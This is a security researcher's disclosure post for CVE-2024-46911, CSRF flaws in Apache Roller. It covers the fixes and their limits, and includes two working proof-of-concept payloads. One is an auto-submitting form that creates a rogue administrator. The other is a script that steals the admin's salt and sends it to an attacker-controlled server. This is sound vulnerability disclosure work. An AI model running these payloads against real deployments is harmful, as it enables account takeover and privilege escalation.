---
title: "CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller"
date: "2024-10-12"
categories: 
  - "Research"
---

## Overview

Apache Roller [1], an open-source blog server platform, has long been favored for managing and publishing content on the web. However, like many web-based applications, it can be subject to vulnerabilities that pose security risks. This blog post discusses the details of the vulnerabilities recently addressed in Apache Roller and assigned `CVE-2024-46911`. The report focuses on the security flaws, their impact, remediation steps taken, the limitations of the fixes, and future recommendations for enhancing Roller’s security posture.


## Vulnerability Details

During a recent research of Apache Roller, I identified a vulnerability that allows attackers to exploit a combination of `Input Validation Errors` and `Cross-Site Request Forgery (CSRF)` attacks. While the application uses the `HttpOnly` flag on cookies—preventing them from being accessed by JavaScript—the system lacks robust CSRF protection. This omission leaves the application vulnerable to unauthorized administrative actions.

The core issue I reported is not merely about allowing users to publish arbitrary HTML or JavaScript content. While improper input validation might make it easier for attackers to craft malicious payloads, the real concern lies in the lack of CSRF protection. This enables attackers to craft malicious requests to trick an admin into executing sensitive operations without their knowledge or consent.

An attacker could lure an authenticated administrator to visit a malicious site hosting a CSRF payload. Once the payload is triggered, actions such as modifying administrative settings or changing credentials could be performed, bypassing the need for direct interaction with the vulnerable Apache Roller weblog. This demonstrates that the lack of CSRF protection poses a security risk even in trusted environments, as the attack can be executed remotely via external websites.

### First-report payload

```
<html>
  <body>
    <form action="http://localhost:8080/roller/roller-ui/admin/createUser.rol" method="POST">
      <input type="hidden" name="salt" value="salt_obtained_from_any_api_call_from_normal_user" />
      <input type="hidden" name="bean&#46;userName" value="hacker" />
      <input type="hidden" name="bean&#46;screenName" value="hacker" />
      <input type="hidden" name="bean&#46;fullName" value="hacker" />
      <input type="hidden" name="bean&#46;password" value="hacker" />
      <input type="hidden" name="bean&#46;emailAddress" value="hacker-email&#64;attacker&#46;com" />
      <input type="hidden" name="bean&#46;locale" value="en&#95;US" />
      <input type="hidden" name="bean&#46;timeZone" value="America&#47;Chicago" />
      <input type="hidden" name="bean&#46;enabled" value="true" />
      <input type="hidden" name="&#95;&#95;checkbox&#95;bean&#46;enabled" value="true" />
      <input type="hidden" name="bean&#46;administrator" value="true" />
      <input type="hidden" name="&#95;&#95;checkbox&#95;bean&#46;administrator" value="true" />
      <input type="hidden" name="action&#58;createUser&#33;save" value="Save" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Initial Fix: Sanitizing Weblog Content and Salt Binding

Following my initial report, Apache Roller addressed the vulnerability in version `6.1.4` by introducing two key measures:

- Weblog Content Sanitization: By default, weblog content now undergoes sanitization, preventing arbitrary HTML and JavaScript injections in user-generated content.

- Salt Value Binding: The system now binds the salt value—used as a security mechanism—to the authenticated admin user, preventing its reuse across different users or sessions. This ties the salt value to a single session and reduces its exposure, minimizing the potential for replay attacks.
However, despite these improvements, a new vulnerability was uncovered that still allows attackers to compromise Site Admin privileges by stealing the salt value through an administrative endpoint.

### Follow-up Report: CSRF Vulnerability via Administrative Endpoint

With the fix in my previous report, it is a bit more challenging since salt-value is now tied to a specific user. Then another approach is to find a way to `steal` Admin's salt. In the follow-up to the original vulnerability, I identified a new security flaw in the Web Analytics configuration feature accessible to admin users. This vulnerability exposes a salt value to attackers who can craft malicious requests to extract sensitive data. The exploit works by leveraging the `XMLHttpRequest (XHR)`` object, which can retrieve and relay the salt value without the admin's knowledge.

- Affected Component:
Endpoint: `/roller/roller-ui/admin/globalConfig.rol` (Admin Endpoint), only accessible to admin users


The Apache Roller Admin endpoint exposes a sensitive salt value embedded within an HTML hidden input field. When an admin user accesses this endpoint, the response includes a hidden form field containing the salt:

```
<input type="hidden" name="salt" value="nHmPrUUmY6gOrmt7I4yc" id="globalConfig_salt"/><h3>Site Settings</h3>
```

An attacker with lower privileges can exploit this flaw by tricking an admin into visiting a malicious weblog or external site controlled by the attacker. Using an `XMLHttpRequest (XHR)`` object or similar mechanism, the attacker can silently make a GET request to `/roller/roller-ui/admin/globalConfig.rol`, retrieve the salt from the response, and forward it to an attacker-controlled server.

Once the attacker has obtained the salt, they can utilize it to perform unauthorized actions, such as privilege escalation or further compromising the system by impersonating the admin in future requests.

## Second-report payload

```
<script>
var req = new XMLHttpRequest();

// Make a GET request to the admin-only endpoint
req.open('GET', 'http://localhost:8080/roller/roller-ui/admin/globalConfig.rol', true);
req.onreadystatechange = function() {
    if (req.readyState === 4 && req.status === 200) {
        // Parse the response to find the salt value
        var parser = new DOMParser();
        var doc = parser.parseFromString(req.responseText, 'text/html');
        var saltInput = doc.querySelector('input[type="hidden"][name="salt"]');

        if (saltInput) {
            var saltValue = saltInput.getAttribute('value');

            // Forward the salt value to the attacker's controlled server
            var postReq = new XMLHttpRequest();
            postReq.open('POST', 'http://localhost:8081/stealing-salt', true);
            postReq.setRequestHeader('Content-Type', 'text/plain');
            postReq.send(saltValue);
        }
    }
};
req.send();
</script>
```

## Remediation

- `One-time-use Salt`: As part of the fix, one-time-use salts have been implemented. After each successful use, the salt is invalidated and removed from the cache to prevent reuse in further requests. This limits the attack window, even if an attacker manages to obtain a valid salt.

- `Sanitization of Weblog Content`: By default, HTML sanitization ensures that arbitrary HTML and JavaScript content cannot be injected into weblog posts, mitigating one vector for exploiting the vulnerability.

- Example of how salts are now being handled in the updated code:

```
// Validate the salt value from the request
String salt = httpReq.getParameter("salt");
if (salt == null || !Objects.equals(saltCache.get(salt), userId)) {
    log.debug("Invalid salt found for POST to: " + httpReq.getServletPath());
    throw new ServletException("Security Violation: Invalid Salt");
}

// Invalidate the salt after successful use
saltCache.remove(salt);
log.debug("Salt used and invalidated: " + salt);
```

By invalidating the salt after its first use, this approach ensures that salts cannot be reused by attackers attempting to replay malicious requests.

## Limitations

- Partial Fix: While the introduction of one-time-use salts significantly improves security, the exposure of the salt value still remains a critical issue. The salt, once embedded in the response, can still be intercepted through XHR or similar attacks, making it a potential risk in the future.

- Trust Assumptions: The fix assumes that trusted admins will not be tricked into visiting malicious sites or unknowingly interacting with attacker-controlled resources. However, the potential for social engineering or phishing still exists.

## Future Recommendations

- Switch to Secure CSRF Tokens: Moving away from salt-based protection to using secure CSRF tokens (e.g., generated server-side and stored in HttpOnly, SameSite cookies) would provide a more robust defense. This would prevent tokens from being accessed by JavaScript and stop them from being used in CSRF attacks.

- JWT-based Protection: Implement JSON Web Tokens (JWTs) for session management and request validation. JWTs are self-contained and can carry authentication data securely. They can be used to validate each request and are harder to forge when properly signed.

- Expiring Salt Values: While one-time-use salts help mitigate attacks, implementing short-lifetime salts with expiration times could further limit their usefulness if intercepted.

## Acknowledging the Author's Effort

The author of Apache Roller - Dave Johnson - has been proactive in addressing the vulnerabilities identified in these reports. In response to my findings, Dave quickly implemented key security enhancements, such as the sanitization of weblog content by default and the introduction of one-time-use salt values. These improvements significantly reduce the attack surface, particularly for low-privilege users attempting to escalate their permissions.

However, it's also important to acknowledge the current usage landscape of Apache Roller. As the author pointed out in our previous discussions, Apache Roller today is primarily used by security researchers rather than by a broad base of end users or enterprise deployments. Given this context, implementing a completely new CSRF protection mechanism—such as JWT-based token storage or the adoption of secure CSRF tokens—might be considered overkill for the current state of the project.

Instead, the author has opted for a balanced approach that effectively minimizes the risk of known attack vectors while maintaining the simplicity and usability of the platform. This demonstrates the author’s understanding of both the security implications and the real-world application of the software.

## Contributors Welcome

Although the current fixes help minimize the impact of the identified vulnerabilities, Apache Roller, like all open-source projects, thrives on community involvement. If future contributors want to further enhance security or extend the platform’s capabilities, contributions are always welcome. With Apache Roller's unique position in the open-source blogging space, there’s plenty of opportunity for those interested in advancing its security or overall functionality.

By encouraging contributions while keeping the platform light, Apache Roller maintains an equilibrium between functionality and security—a thoughtful response to its current user base.

Kudos to Apache Roller's creators! 

## References

[1] https://github.com/apache/roller
